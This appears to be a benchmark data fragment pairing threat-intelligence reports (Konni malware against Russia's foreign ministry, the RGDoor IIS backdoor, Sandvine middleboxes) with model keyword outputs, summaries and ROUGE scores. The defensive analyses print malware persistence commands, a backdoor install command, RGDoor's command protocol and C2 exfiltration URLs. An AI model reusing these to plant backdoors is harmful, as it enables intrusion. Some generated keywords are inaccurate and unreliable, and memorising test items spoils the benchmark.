links to a series of spoofed MID portals to harvest credentials from MID personnel. The actor then deployed Covid-related lures in November 2021 consisting of malicious URLs that downloaded files impersonating the Department of Health and Health Service. One of the files installed a fake version of the Russian-mandated vaccination registration software and served as a loader for additional malicious files. In December 2021, after successfully compromising the email account of a staff member of the MID, the threat actor targeted at least two other MID entities via emails from the compromised account: the Russian Embassy in Indonesia and a deputy minister overseeing non-proliferation and arms control, among other responsibilities. The emails propagated a \u201cHappy New Year\u2019s\u201d message containing a trojanized screensaver attachment. These activity clusters are connected in a number of ways: First, the spoofed hostnames from the October cluster resolved to the same malicious IP that sent the targeted emails containing the screensaver. Second, the initially observed TTPs used in the November activity correlated to the December activity. Finally, the screensaver from the December activity downloaded a first-stage agent which is nearly identical to the agent previously reported by Malwarebytes.Technical DetailsFigure 1: Overview of Konni campaign against Russian Ministry of Foreign Affairs (MID)2/10October 2021: Phishing for Initial Access We assess the campaign began on or around October 19, 2021, with the initial goal of harvesting credentials. The Black Lotus Labs team discovered a series of spoofed hostnames impersonating MID portals that all resolved to the same single IP address: 152.89.247[.]26. One hostname, portal.newint-mid.ru.carnegieinsider[.]com, had a Let\u2019s Encrypt X.509 certificate that was issued on October 19, 2021.Figure 2: Screenshot of the Let\u2019s Encrypt X.509 certificate for a spoofed MID portal hostnameIn addition, we discovered two other spoofed hostnames resolving to the 152.89.247[.]26 IP address during mid-October. These additional hostnames referenced email services frequently used in Russia, such as Yandex and mail.ru: e.mail.ru.settings.pronto- login[.]com and passport.yandex.ru-settings.pronto-login[.]com.All the spoofed hostnames that resolved to this IP address used either the domain pronto- login[.]com or carnegieinsider[.]com.For a full list of spoofed hostnames, see the Indicators of Compromise section at the end of this report.November 2021: Covid Vaccination Registration Activity Based upon file metadata, we assess that the next cluster of activity occurred on approximately November 7, 2021. In this timeframe, the threat actor sent out malicious URL links that, if clicked, downloaded a file that was hosted on Yandex\u2019s cloud service.3/10Figure 3: The malicious hyperlink to download the .zip fileThe downloaded .zip file (named oloo@mid.ru.zip) impersonated the \u201c\u041e\u0422\u0414\u0415\u041b \u041b\u0415\u0427\u0415\u0411\u041d\u041e- \u041e\u0417\u0414\u041e\u0420\u041e\u0412\u0418\u0422\u0415\u041b\u042c\u041d\u041e\u0413\u041e \u041e\u0411\u0415\u0421\u041f\u0415\u0427\u0415\u041d\u0418\u042f,\u201d which loosely translates to the \u201cDepartment of Health and Health Services for the Russian Federation Ministry of Foreign Affairs.\u201d This .zip file contained several benign PDFs and Word documents that asked the recipient to provide information regarding vaccination status and to sign a consent form. The timing of this activity closely aligned with the passage of Russian Vaccine Passport laws that mandated Russians had to receive a QR code from the government to prove vaccination in order to access public places such as restaurants and bars.4/10Figure 4: One of the files downloaded from Yandex cloud that discussed the vaccine mandateThe .zip file also contained an installer file called oloo@mid.ru/\u041f\u0420\u041e\u0413\u0420\u0410\u041c\u041c\u0410 \u0414\u041b\u042f \u0420\u0415\u0413\u0418\u0421\u0422\u0420\u0410\u0426\u0418\u0418 \u041f\u0420\u0418\u0412\u0418\u0422\u042b\u0425 \u0412 \u0424\u0415\u0414\u0415\u0420\u0410\u041b\u042c\u041d\u041e\u041c \u0420\u0415\u0413\u0418\u0421\u0422\u0420\u0415 \u0412\u0410\u041a\u0426\u0418\u041d\u0418\u0420\u041e\u0412\u0410\u041d\u041d\u042b\u0425.exe which translates to \u201cProgram for Vaccination Registration in the Federal Registry.exe.\u201d This installer impersonated a legitimate software the Russian people were directed to install in order to receive QR codes verifying their vaccination status. If invoked, this installer would also surreptitiously run a malicious loader file that attempted to retrieve a compressed file from the threat actor hostname victory- 2020.atwebpages[.]com. Unfortunately, we were not able to recover a copy of the first stage payload. However, the functionality for the Covid registration loader is nearly identical to that of the loader used in a December 2021 activity.5/10December 2021: Happy New Year\u2019s Activity On December 20, 2021, we detected malicious emails being sent from a compromised MID account, mskhlystova@mid[.]ru. When we examined the email headers, we identified they were originating from the same IP address from the October phishing activity, 152.89.247[.]26. Copies of the malicious emails and their translations are below.Figure 5: Screenshot of two malicious emails sent by the threat actorFigure 6: English translation of the emailsAs of the time of this writing, we have identified two recipients of the emails, although we suspect there are more. The first was sent to the Russian Embassy in Indonesia: rusemb.indonesia@mid[.]ru . The second email was sent to Sergey Alexeyevich Ryabkov who was, according to a cached version of the MID website at the end of December 2021, responsible for \u201cbilateral relations with North and South America, non-proliferation and arms control, Iran\u2019s nuclear program and Russia\u2019s participation in the BRICS association,\u201d an international alliance comprised of Brazil, Russia, India, China and South Africa. [Note: The MID website link is no longer active.]If the malicious email was opened, it prompted the user to download and click the attached .zip file titled \u201c\u043f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435\u201d, which means \u201cCongratulations.\u201d Upon decompression, it revealed a screensaver file by the same name that, when clicked,6/10displayed a festive holiday screensaver wishing the recipient a Happy New Year while also surreptitiously running a light-weight loader to retrieve a file from the C2 node at hxxp://i758769.atwebpages[.]com.Figure 7: Benign Happy New Year\u2019s screensaver that was displayed on the infected machineWhen we analyzed the network communications generated by the screensaver file, we noticed an interesting evasion technique. When the loader file reached out to the threat actor command and control node to obtain the first stage payload, the actor configured the server to respond with a code of \u201c401 unauthorized.\u201d Typically, a 401 error means the user making the request was not authorized to view the webpage and, in many cases, it results in the session being terminated. However, in this case, the website returned a malicious payload in the second part of the response. This was likely a tactic to avoid detection.Figure 8: Screenshot showing the C2 serving a 401 error code with the accompanying payload7/10The C2 node served the requesting machine a Microsoft Cabinet File (.cab). Once the .cab file was decompressed, it contained three more files: install.bat, scrnsvc.dll and scrnsvc.ini.Figure 9: Overview of the Happy New Year\u2019s activityThese files were placed at the following location: %windir%/system32/. The install.bat file created a service called \u201cScreenSaver Management Service\u201d that executed the malicious files on start. It then modified two registry keys on the infected machine.Reg add \u201cHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\u201d /v scrnsvc /t REG_MULTI_SZ /d \u201cscrnsvc\u201d /f > nulreg add \u201cHKLM\\SYSTEM\\CurrentControlSet\\Services\\scrnsvc\\Parameters\u201d /v ServiceDll /t REG_EXPAND_SZ /d \u201c%windir%\\System32\\scrnsvc.dll\u201d /f > nulIf the scrnsvc.dll and scrnsvc.ini files were already on the host machine, they were copied to the file path %windir%\\System32. The .bat file then attempted to clean up some of the artifacts and launched the .dll file.The .dll file checked the infected machine for the presence of a .dat file at the following location: %windir%/system32/scrnsvc.dat. If no such file was found, it decrypted the contents of scrnsvc.ini which contained the threat actor hostname (url The .dll file then downloaded a file from url and saved it as %windir%/system32/scrnsvc.dat. Once decrypted, the scrnsvc.dat revealed the location of the second command and control server at hostname url the .dll file performed some basic host-based reconnaissance on the infected machine. It ran the systeminfo command from the command line of the infected machine to allow the threat actor to obtain information such as: hostname, OS name, OS version, domain, processor, BIOS version, etc. The .dll file then compressed the contents of the systeminfo command as a .cab file, encrypted it and uploaded it to the second threat actor-controlled hostname (hxxp://h378576.atwebpages[.]com/up.php? name=COMPUTER_NAME), which prompted a \u201csuccess!\u201d message as the response.Figure 10: Screen shot depicting \u201csuccess!\u201d messageNext, the.dll file obtained a list of all the running tasks, via tasklist, on the infected machine and repeated the same process of compressing, encrypting and subsequently uploading that file to the threat actor C2.The .dll file then attempted to download another payload from the second C2 h378576.atwebpages[.]com/dn.php?name={Host name}&prefix=cc (0). It entered a loop where the agent slept and attempted to reach back out to obtain the next payload at the URL h378576.atwebpages[.]com/dn.php?name={Host Name}&prefix=tt. Unfortunately, we were unable to recover a copy of the next payload. We suspect that the threat actor only served the next payload to a limited number of targeted machines based upon the contents of systeminfo and tasklist information that was uploaded to the C2.Based on the observed TTPs, including the use of a light-weight loader to retrieve a .cab file comprised of install.bat, the use of .dll to call an .ini file, the host-based commands and similar URL structures for the C2s, we observe strong correlation with the malware previously reported as Konni.Conclusion At Black Lotus Labs, we continue to track the use of Konni malware. While this particular campaign was highly targeted, it is vital for defenders to understand the evolving capabilities of advanced actors to achieve infection of coveted targets.9/10We advise our customers to perform full monitoring of network resources, use of multifactor authentication and reemphasizing the importance of phishing awareness to employees. These defensive measures that can help protect sensitive networks from this type of malicious activity.Black Lotus Labs blocked the threat actor infrastructure across the Lumen global IP network to protect customers and the wider internet ecosystem in the event that this actor re-uses the infrastructure in future campaigns. We also added these indicators to the Black Lotus Labs reputation system, which feeds Lumen\u2019s security portfolio. We will continue to follow this activity to detect and disrupt similar campaigns, and we encourage other organizations to alert on these and similar indicators in their environments.For additional IoCs such as file hashes associated with this campaign, please visit our GitHub page.If you would like to collaborate on similar research, please contact us on Twitter @BlackLotusLabs.This analysis was performed by Danny Adamitis and Steve Rudd.This information is provided \u201cas is\u201d without any warranty or condition of any kind, either express or implied. Use of this information is at the end user\u2019s own risk.Services not available everywhere. \u00a92021 Lumen Technologies. All Rights Reserved.10/10 ", "generated_text": "the report; Black Lotus Labs; espionage; the Russian Ministry of Foreign Affairs; MID; access; credentials; the Konni malware; the Democratic People\u2019s Republic of Korea; October 2021; credentials; a government software program; new Covid mandates; October 2021; a trojanized screensaver; the malware; a compromised account; Indonesia; a deputy minister; the Russian Embassy; Indonesia; the email account; Indonesia; Indonesian; a deputy minister; the emails; a happy new year; a trojanized screenaver; a first-stage agent; the agent; a VPN; HTTP; a GET; a HTTP request; c2; a browser; IP; the activity; the Russian Ministry of Foreign Affairs; indicators; compromise; persistence; targets.", "ref_text": "<START-1>This PDF documents a cyber espionage campaign targeting the Russian Ministry of Foreign Affairs (MID) that uses the Konni malware. Here is a summary: The campaign began in October 2021 with phishing links impersonating MID portals to harvest credentials. In November, the threat actor sent COVID-19 themed lures with files impersonating Russian vaccine registration software that installed malware. In December, the actor compromised an MID email account and sent malicious emails with a trojanized screensaver to MID personnel. Analysis found connections between the phases - same IP, similar TTPs, nearly identical malware. The screensaver downloaded a light-weight loader that retrieved additional payloads from command and control servers. The malware gathered system info and running tasks from infected machines. Based on the tactics, techniques, and procedures, the malware has been attributed to the Konni malware linked to North Korean state-sponsored cyber espionage operations. The campaign demonstrates the persistence of advanced threat actors in targeting high-value organizations through multiple stages to establish network access and enable cyber espionage. Defensive measures like monitoring, multi-factor authentication, and employee education can help protect against such threats. <END-1>", "t5/keyword/hint_hit_precision": 0.27906976744186046, "t5/word/hint_hit_recall": 0.1270718232044199, "gpt3/lexical/rouge_rouge1": 0.47648902821316613, "gpt3/lexical/rouge_rouge2": 0.13249211356466875, "gpt3/lexical/rouge_rougeL": 0.2884012539184953, "gpt3/lexical/rouge_rougeLsum": 0.2884012539184953, "gpt3_generated_text": ["The report by Black Lotus Labs details a series of targeted actions against the Russian Ministry of Foreign Affairs (MID) involving the Konni malware, previously associated with the Democratic People's Republic of Korea. The campaign, which began in October 2021 with phishing for credentials, escalated to exploiting trusted connections through a government software program related to Covid mandates and trojanized files. In December 2021, the threat actor targeted the MID, the Russian Embassy in Indonesia, and a deputy minister with trojanized screensaver emails. The activity clusters are interconnected, demonstrating persistence and multi-phased espionage tactics. The report provides technical details on the malware's distribution and its connection to previous campaigns. The findings highlight the importance of vigilance against targeted cyber threats and the need for enhanced security measures to protect sensitive networks."]}, {"split_name": "val", "sample_id": "val_82", "prompt_text": "Extract the keywords: Blog Home (url > Unit 42 (url > OilRig uses RGDoor IIS Backdoor on Targets in the Middle EastOilRig uses RGDoor IIS Backdoor on Targets in the Middle EastBy Robert Falcone (url January 25, 2018 at 5:00 AM Category: Unit 42 (url Tags: Middle East (url OilRig (url RGDoor (url TwoFace (url \ue800 6,724 \ue802(3)(url iis-backdoor-targets-middle-east%2F+OilRig+uses+RGDoor+IIS+Backdoor+on+Targets+in+the+Middle+East) \ue805 (url u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-oilrig-uses-rgdoor-iis- backdoor-targets-middle-east%2F) \ue804 (url mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-oilrig-uses- rgdoor-iis-backdoor-targets-middle- east%2F&title=OilRig+uses+RGDoor+IIS+Backdoor+on+Targets+in+the+Middle+East&summary=&source=) (//www.reddit.com/submit)Summary While investigating \ufb01les uploaded to a TwoFace (url webshell, Unit 42 discovered actors installing an Internet Information Services (IIS) backdoor that we call RGDoor. Our data suggests that actors have deployed the RGDoor backdoor on webservers belonging to eight Middle Eastern government organizations, as well as one \ufb01nancial and one educational institution. We believe the actors deploy RGDoor as a secondary backdoor to regain access to a compromised webserver in the event a victim organization detects and removes the TwoFace shell. We do not have HTTP logs that show the actor interacting with RGDoor, so we do not know the activities the actors carry out using the backdoor. However, we were able to create a client application to interact with RGDoor for testing purposes, which allowed us to interact with the backdoor to see how it operates on an IIS server. RGDoor Unlike TwoFace, the actors did not develop RGDoor in C# to be interacted with at speci\ufb01c URLs hosted by the targeted IIS web server. Instead, the developer created RGDoor using C++, which results in a compiled dynamic link library (DLL). The DLL has an exported function named \u201cRegisterModule\u201d, which is important as it led us to believe that this DLL was used as a custom native-code HTTP module that the threat actor would load into IIS. Starting with IIS 7 (url developers could create modules in C++ that the IIS webserver would load to extend IIS\u2019 capabilities, such as carry out custom actions on requests. The fact that RGDoor is an IIS HTTP module suggests that there is no visual representation of the shell for actors to interact with, which also di\ufb00ers from TwoFace\u2019s interface that actors can interact with by visiting the URL to the TwoFace ASPX \ufb01le. According to Microsoft\u2019s documentation (url native-code modules can be installed either in the IIS Manager GUI or via the command-line using the \u201cappcmd\u201d application. While we do not have logs to determine exactly how the actors install RGDoor, the actor can use the TwoFace webshell to install the RGDoor module via the command line. The following command could be used to install the HTTP module on an IIS server: %systemroot%\\system32\\inetsrv\\APPCMD.EXE install module /name:[module name] /image:[path to RGDoor DLL] /add:true We con\ufb01rmed the command above successfully installed the RGDoor backdoor in our test environment. Figure 1 shows the speci\ufb01c command we used to install RGDoor on our IIS server.Figure 1 Command-line used to install RGDoor module into IISWe con\ufb01rmed RGDoor installed correctly into IIS by checking the HTTP Modules display in IIS Manager. Figure 2 shows the RGDoor DLL (HTTPParser.dll) was loaded into IIS using the module name HTTPParser.Figure 2 Installed RGDoor module displayed in the HTTP Modules list in IIS MangerListening for Commands We analyzed RGDoor samples and found that the \u201cRegisterModule\u201d function does very little other than calling the IHttpModuleRegistrationInfo::SetRequestNoti\ufb01cations method. According to MSDN (url us/library/ms693045(v=vs.90).aspx), the SetRequestNoti\ufb01cations function has the following prototype, which allows a developer to con\ufb01gure the module to handle GET requests (dwRequestNoti\ufb01cations) and/or POST requests IN IHttpModuleFactory * pModuleFactory, IN DWORD dwRequestNotifications, IN DWORD dwPostRequestNotifications ) In RGDoor, the code calls this function with arguments that ignore inbound HTTP GET requests, but act on all HTTP POST requests seen by the IIS server, even POST requests issued over HTTPS. RGDoor calls this function with the following arguments, the third of which (dwPostRequestNoti\ufb01cations) is set to \u201cRQ_BEGIN_REQUEST\u201d, which is an event triggered immediately after IIS receives the POST request: SetRequestNotifications(pModuleFactory,0,RQ_BEGIN_REQUEST) RGDoor is noti\ufb01ed immediately when the IIS server receives an inbound HTTP POST request. RGDoor parses these POST requests, speci\ufb01cally looking for the HTTP \u201cCookie\u201d \ufb01eld by accessing the HTTP header with the following function call: pHttpContext >GetRequest() >GetHeader(\u201cCookie\u201d,NULL) After accessing the cookie \ufb01eld, RGDoor parses this \ufb01eld by looking for the string \u201cRGSESSIONID=\u201d, which is the basis for the name RGDoor. If present, the code uses the two-bytes immediately following the \u201cRGSESSIONID=\u201d string as a decryption key, speci\ufb01cally treating the two character bytes as a single hexadecimal byte. For instance, the two-byte key of \u201c00\u201d would represent the hexadecimal value of 0x00, where \u201cFF\u201d would represent 0x\ufb00, and so on. The key is followed by a Base64 encoded string that contains ciphertext. The following represents the structure of the cookie \ufb01led in inbound RGDoor requests: RGSESSIONID=[two bytes for key][Base64 encoded ciphertext] RGDoor decodes the Base64 encoded string and then decrypts the decoded string using a custom algorithm. The custom algorithm iterates through the ciphertext using the \u2018pxor\u2019 instruction to XOR each byte of ciphertext with the single-byte hexadecimal value from the two-byte character key provided in the cookie \ufb01eld. The code will parse the cleartext looking for one of three commands: \u201ccmd$\u201d, \u201cupload$\u201d and \u201cdownload$\u201d. The code treats the string immediately following the command as the command\u2019s argument. Table 1 provides the arguments and further details on the three commands.CommandDescriptioncmd$[command to execute]Uses \u201cpopen\u201d to run the speci\ufb01ed command. It enters a loop that calls \u201cfgets\u201d to get the command results. The loop \ufb01nishes when a call to \u201cfeof\u201d designates the end of the command results, which are relayed back to the actor via the HTTP response.upload$[path to \ufb01le] Gets the length of uploaded data bychecking the \u201cContent-Length\u201d \ufb01eld within the HTTP request. Uses the IHttpRequest::GetRemainingEntityBytes and IHttpRequest::ReadEntityBody methods to obtain base64 encoded data within the body of the HTTP POST request. The code decrypts the decoded data using the XOR algorithm and writes the data to the speci\ufb01ed \ufb01le. It will respond to this request with either \u201cwrite done \u29f5r\u29f5n\u201d or \u201ccan\u2019t open \ufb01le: \u201c. Reads a speci\ufb01ed \ufb01le and encrypts it with the XOR algorithm, Base64 encodes the ciphertext and sends the data back to the actor via the HTTP response.download$[path to \ufb01le]Table 1 Commands available within RGDoorResponding to Commands When responding to inbound requests, the code will clear the response that IIS would have responded to the HTTP POST request by calling the following functions: pHttpContext >GetResponse() >Clear() RGDoor then constructs its own HTTP response by \ufb01rst setting the \u201cContent-Type\u201d \ufb01eld within the HTTP header to \u201ctext/plain\u201d. Figure 3 shows the code that uses the IHttpResponse::SetHeader method to set the \u201cContent-Type\u201d \ufb01eld within the HTTP response to \u201ctext/plain\u201d, speci\ufb01cally by using a value of 0xC (0xA + 2) for the ulHeaderIndex within HTTP_HEADER_ID enumeration.Figure 3 RGDoor code to set the HTTP Content-Type to \u201ctext/plain\u201dThe sample then transmits the data back to the actor by creating a loop that calls the IHttpResponse::WriteEntityChunk method until all of the data is sent to the actor within HTTP responses. If the WriteEntityChunk method fails at any point during this loop, the code will respond to the actor with a HTTP 500 \u201cServer Error\u201d response by using the IHttpResponse::SetStatus method. Interacting with RGDoor We created a client application to interact with the RGDoor module, speci\ufb01cally to issue commands to the backdoor and to see how it operates on the IIS server. As mentioned previously in this blog, RGDoor has three available commands, speci\ufb01cally \u201ccmd$\u201d, \u201cupload$\u201d and \u201cdownload$\u201d. We used our client to issue one of each of these commands. Figure 4 shows the HTTP request and response to our \ufb01rst interaction with the RGDoor module. The command issued in this request was \u201ccmd$whoami\u201d, which instructs RGDoor to run the \u2018whoami\u2019 command in command prompt. The key used to encrypt this command was \u201c54\u201d (0x54), which resulted in Base64 encoded string of \u201cNzkwcCM8OzU5PQ==\u201d. The HTTP response shows the RGDoor module returned the Base64 encoded string of \u201cPT0ndDUkJCQ7OzgIMDEyNSE4IDUkJCQ7OzheVA==\u201d, which when decrypted using the same \u201c54\u201d key is the result of the \u2018whoami\u2019 command, speci\ufb01cally the string \u201ciis apppool\u29f5\u29f5defaultapppool\u29f5n\u29f5x00\u201d.Figure 4 Issuing \u2018whoami\u2019 command and RGDoor\u2019s responseFigure 5 shows our testing of RGDoor\u2019s upload command, speci\ufb01cally \u201cupload$c:\u29f5windows\u29f5temp\u29f5test.txt\u201d that uploads a \ufb01le from our local system to the webserver. The inbound request uses a key of \u201c54\u201d (0x54) that results in an encoded command string of \u201cISQ4OzUwcDduCCM9OjA7IycIIDE5JAggMScgeiAsIA=\u201d. The request also includes the string \u201cIDEnID06M2VmZ14=\u201d within the POST data, which is the string \u201ctesting123\u29f5n\u201d from the \ufb01le on our local system encrypted using the \u201c54\u201d key that will be written to the \u201ctest.txt\u201d \ufb01le on the server. As you can see from the HTTP response, RGDoor responded to this command with \u201cwrite done\u201d, which is interesting as the response was in cleartext and not encrypted using the custom algorithm.Figure 5 Uploading a \ufb01le to server via RGDoor Downloading a \ufb01le from the server via RGDoorFigure 6 shows our testing of the download command within RGDoor, speci\ufb01cally a command \u201cdownload$c:\u29f5windows\u29f5temp\u29f5test.txt\u201d that downloads the \ufb01le uploaded in our previous test. We chose to use the key \u201c89\u201d (0x89) in this test to showcase RGDoor\u2019s ability to use any hexadecimal byte as a key, which resulted in an encoded command string of \u201c7eb+5+Xm6O2t6rPV/uDn7eb++tX97OT51f3s+v2n/fH9\u201d. RGDoor responds to this command with the encoded string \u201c/ez6/eDn7ri7uoM=\u201d, which when decrypted with the \u201c89\u201d key results in the string \u2018testing123\u29f5n\u2019, which is the contents of the \u201ctest.txt\u201d \ufb01le.Figure 6 Downloading a \ufb01le from the server via RGDoorTo determine how the RGDoor client requests appears within the IIS request logs, we checked the logs of our default IIS installation in our test environment. By default, IIS does not log the values within Cookie \ufb01elds of inbound HTTP requests, which would contain commands issued by actors to RGDoor. To see inbound RGDoor requests, an administrator must con\ufb01gure logging of Cookie \ufb01elds in IIS, which can be selected in the W3C Logging Fields dialog in IIS Manager, as seen in Figure 7.Figure 7 W3C Logging Fields dialog in IIS Manager with Cookie \ufb01elds enabledThe HTTP requests sent by the client to the RGDoor backdoor in the testing above will generate logs on the IIS server. Without the Cookie \ufb01eld logged, it is di\ufb03cult to locate and analyze inbound requests related to RGDoor. Remember that RGDoor is an IIS module that checks all inbound POST requests for commands, so an actor does not need to use one particular URL to interact with RGDoor. However, the following shows the IIS log generated from the \ufb01rst testing request we made using our RGDoor client, which shows the \u201cRGSESSIONID=\u201d string, the \u201c54\u201d key and the Base64 encoded command within the Cookie \ufb01eld: 4#Software: Microsoft Internet Information Services 7.5 #Version: 1.0 #Date: 2017-10-03 19:30:13 #Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Cookie) sc-status sc-substatus sc-win32-status time-taken 0 285Conclusion RGDoor is an IIS backdoor that actors used the TwoFace webshell to load onto an IIS web server. The RGDoor provides backdoor access to the compromised server, which we speculate the actors loaded in order to regain access to the server in the event the TwoFace webshell was removed. This backdoor has a rather limited set of commands, however, the three commands provide plenty of functionality for a competent backdoor, as they allow an actor to upload and download \ufb01les to the sever, as well as run commands via command prompt. The use of RGDoor suggests that this group has contingency plans to regain access to a compromised network in the event their webshells are discovered and remediated. Palo Alto Networks customers are protected from RGDoor by the following:All RGDoor samples have malicious verdicts in WildFire AutoFocus customers can investigate this activity with the RGDoor (url#/tag/Unit42.RGDoor) tag IPS Signature RGDoor.Gen Command and Control Tra\ufb03c (ID 11885) detects RGDoor network tra\ufb03cIndicators of Compromise iishandler6.dllGot something to say?Leave a comment Notify me of followup comments via e-mailName (required)Email (required)WebsiteSUBMITSUBSCRIBESUBSCRIBE TO NEWSLETTERSEmailCOMPANY Company (url Careers (url Sitemap (url Report a Vulnerability (url NOTICES Privacy Policy (url Terms of Use (url Manage Subscription (url\uf08c (url \uf082 (url \uf081 (url\u00a9 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 866.320.4788 \uf101SEE A DEMO \uf101TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD) ", "generated_text": "Palo Alto Networks; OilRig; a webshell; TwoFace; the shell; the actors; links; dynamic link library; DLL; the backdoor; eight Middle Eastern government organizations; financial and one educational institution; HTTP; functionality; the shell; The DLL; an exported function; RegisterModule; the threat actor; a compromised webserver; the incident; the twoFace webshell; the actor; communications; the backdoor; logs; the actors; IIS Manager; the command; the twoFace shell; the domains; the shell; registry keys; the IIS Manager.", "ref_text": "<START-1>The document describes a backdoor named RGDoor used by a threat actor group called OilRig to maintain access to compromised servers, primarily in the Middle East region. OilRig initially infects servers using a web shell called TwoFace. To have a backup method of access if TwoFace is detected and removed, they also install the RGDoor backdoor module into the IIS web server. RGDoor is stealthier as it does not present a visual web interface like TwoFace. It is installed via IIS configuration and checks all HTTP POST requests for commands encrypted in cookie data. Available commands allow uploading/downloading files and running shell commands. RGDoor provides a more discreet and robust backup access mechanism if the TwoFace web shell is remediated on a compromised server. The report found RGDoor installed on web servers belonging to Middle Eastern government, financial, and educational organizations. Specific details are provided on RGDoor's encryption scheme, command structure, and how it interacts with the IIS server. Recommendations are made to monitor IIS logs for telltale RGDoor cookie values. The report concludes that OilRig has contingency plans to regain access, suggesting persistence is a priority for their operations. Defenses against RGDoor are available in various Palo Alto Networks products and services. <END-1>", "t5/keyword/hint_hit_precision": 0.14705882352941177, "t5/word/hint_hit_recall": 0.034482758620689655, "gpt3/lexical/rouge_rouge1": 0.4819277108433735, "gpt3/lexical/rouge_rouge2": 0.12727272727272726, "gpt3/lexical/rouge_rougeL": 0.1927710843373494, "gpt3/lexical/rouge_rougeLsum": 0.1927710843373494, "gpt3_generated_text": ["Palo Alto Networks' Unit 42 discovered that actors associated with the OilRig threat group have been installing a backdoor called RGDoor on webservers belonging to eight Middle Eastern government organizations, as well as a financial and an educational institution. The RGDoor backdoor, developed in C++, is deployed as a secondary backdoor to regain access in case the primary TwoFace webshell is detected and removed. Unlike TwoFace, RGDoor is an IIS HTTP module loaded into the webserver to extend its capabilities without a visual interface for interaction. While the exact installation method is unclear, actors could potentially use the TwoFace webshell to install RGDoor via command line. This incident highlights the ongoing threat actors pose to organizations' web servers and the importance of monitoring and securing IIS environments."]}, {"split_name": "val", "sample_id": "val_83", "prompt_text": "Extract the keywords: 6/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?BAD TRAFFIC Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Affiliate Ads?citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syriaBill Marczak, Jakub Dalek, Sarah McKune, Adam Senft, John Scott-Railton, Ron DeibertMarch 9, 2018This report describes our investigation into the apparent use of Sandvine/Procera Networks Deep Packet Inspection (DPI) devices to deliver nation-state malware in Turkey and indirectly into Syria, and to covertly raise money through affiliate ads and cryptocurrency mining in Egypt.Key FindingsThrough Internet scanning, we found deep packet inspection (DPI) middleboxes on T\u00fcrk Telekom\u2019s network. The middleboxes were being used to redirect hundreds of users in Turkey and Syria to nation-state spyware when those users attempted to download certain legitimate Windows applications. We found similar middleboxes at a Telecom Egypt demarcation point. On a number of occasions, the middleboxes were apparently being used to hijack Egyptian Internet users\u2019 unencrypted web connections en masse, and redirect the users to revenue-generating content such as affiliate ads and browser cryptocurrency mining scripts. After an extensive investigation, we matched characteristics of the network injection in Turkey and Egypt to Sandvine PacketLogic devices. We developed a fingerprint for the injection we found in Turkey, Syria, and Egypt and matched our fingerprint to a second-hand PacketLogic device that we procured and measured in a lab setting. The apparent use of Sandvine devices to surreptitiously inject malicious and dubious redirects for users in Turkey, Syria, and Egypt raises significant human rights concerns.1. SummaryThis report describes how we used Internet scanning to uncover the apparent use of Sandvine/Procera Networks Deep Packet Inspection (DPI) devices (i.e. middleboxes) for malicious or dubious ends, likely by nation-states or ISPs in two countries.1.1. TurkeyWe found that a series of middleboxes on T\u00fcrk Telekom\u2019s network were being used to redirect hundreds of users attempting to download certain legitimate programs to versions of those programs bundled with spyware. The spyware we found bundled byurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/1/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?operators was similar to that used in the StrongPity APT attacks. Before switching to the StrongPity spyware, the operators of the Turkey injection used the FinFisher \u201clawful intercept\u201d spyware, which FinFisher asserts is sold only to government entities.Targeted users in Turkey and Syria who downloaded Windows applications from official vendor websites including Avast Antivirus, CCleaner, Opera, and 7-Zip were silently redirected to malicious versions by way of injected HTTP redirects. This redirection was possible because official websites for these programs, even though they might have supported HTTPS, directed users to non-HTTPS downloads by default. Additionally, targeted users in Turkey and Syria who downloaded a wide range of applications from CBS Interactive\u2019s Download.com (a platform featured by CNET to download software) were instead redirected to versions containing spyware. Download.com does not appear to support HTTPS despite purporting to offer \u201csecure download\u201d links. 1Our scans of Turkey revealed that this spyware injection was happening in at least five provinces. In addition to targets in Turkey, targets included some users physically located in Syria who used Internet services relayed into Syria by T\u00fcrk Telekom subscribers, sometimes via cross-border directional Wi-Fi links. In one case, more than a hundred Syrian users appeared to share a single Turkish IP address. Based on publicly available information we found on Wi-Fi router pages, at least one targeted IP address appears to serve YPG (Kurdish militia) users. YPG has been the target of a Turkish government air and ground offensive which began in January 2018. Areas not controlled by the YPG also appear to be targeted, including the area around Idlib city.1.2. EgyptWe found similar middleboxes at a Telecom Egypt demarcation point. The middleboxes were being used to redirect users across dozens of ISPs to affiliate ads and browser cryptocurrency mining scripts. The Egyptian scheme, which we call AdHose, has two modes. In spray mode, AdHose redirects Egyptian users en masse to ads for short periods of time. In trickle mode, AdHose targets some JavaScript resources and defunct websites for ad injection. AdHose is likely an effort to covertly raise money.1.3. Technology Matches Sandvine PacketLogicAfter an extensive investigation, we matched characteristics of the middleboxes in Turkey and Egypt to Sandvine PacketLogic devices. Sandvine\u2019s PacketLogic middleboxes can prioritize, degrade, block, inject, and log various types of Internet traffic. The company that makes PacketLogic devices was formerly known as Procera Networks, but was recently renamed Sandvine after Procera\u2019s owner, U.S.-based private equity firm Francisco Partners, acquired Ontario-based networking equipment company Sandvine and combined the two companies in 2017. Francisco Partners has a number of investments in dual-use technology companies, including providers of Interneturl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/2/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?surveillance and monitoring tools such as NSO Group, an Israeli company that develops and sells mobile spyware. NSO Group\u2019s spyware has been used in several countries to target journalists, lawyers, and human rights defenders.A 2014 article in a Turkish Newspaper mentioned that Turkey had begun negotiations with Procera to buy a 